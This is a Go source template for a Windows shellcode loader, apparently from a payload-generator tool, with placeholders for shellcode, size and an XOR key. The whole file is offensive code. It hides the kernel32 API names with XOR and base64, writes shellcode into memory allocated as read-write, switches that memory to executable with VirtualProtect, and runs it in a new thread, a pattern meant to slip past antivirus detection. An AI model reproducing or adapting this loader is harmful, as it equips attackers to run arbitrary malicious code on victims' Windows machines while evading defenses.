package main

import (
	"golang.org/x/sys/windows"
	"unsafe"
	"syscall"
	"encoding/base64"
	_ "fmt" 
	_ "os"
	_ "math"
)

var (
	kernel32 = syscall.MustLoadDLL(encodeString(`{{encode "kernel32.dll" .Key }}`))
	procCreateThread = kernel32.MustFindProc(encodeString(`{{encode "CreateThread" .Key }}`))
	virtualAlloc = kernel32.MustFindProc(encodeString(`{{encode "VirtualAlloc" .Key }}`))
	virtualProtect = kernel32.MustFindProc(encodeString(`{{encode "VirtualProtect" .Key }}`))
	key = "{{ .Key }}"
)

func encodeString(s string) (res string) {
	tmp, _ := base64.StdEncoding.DecodeString(s)
	x, _ := base64.StdEncoding.DecodeString(key)
	for i := 0; i < len(tmp); i++ {
		res += string(tmp[i] ^ x[i % len(x)])	
	}
	return
}

func encodeByteArray(s string) (res []byte) {
	tmp, _ := base64.StdEncoding.DecodeString(s)
	x, _ := base64.StdEncoding.DecodeString(key)
	for i := 0; i < len(tmp); i++ {
		res = append(res, tmp[i] ^ x[i % len(x)])	
	}
	return
}

func main() {
	sc := {{ .Shellcode }}
	n := {{ .Size }}	
	addr, _, _ := virtualAlloc.Call(uintptr(0), uintptr(n), windows.MEM_RESERVE | windows.MEM_COMMIT, windows.PAGE_READWRITE)
	buf := (*[{{ .Size }}]byte)(unsafe.Pointer(addr))
	for i := 0; i < n; i++ {
		buf[i] = sc[i]	
	}
	var oldProtect uint32	
	_, _, _ = virtualProtect.Call(addr, uintptr(n), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
	r1, _, _ := procCreateThread.Call(uintptr(0), 0, addr, uintptr(0), 0, 0)
	h := syscall.Handle(r1)
	syscall.WaitForSingleObject(h, syscall.INFINITE)
	syscall.CloseHandle(h)
}
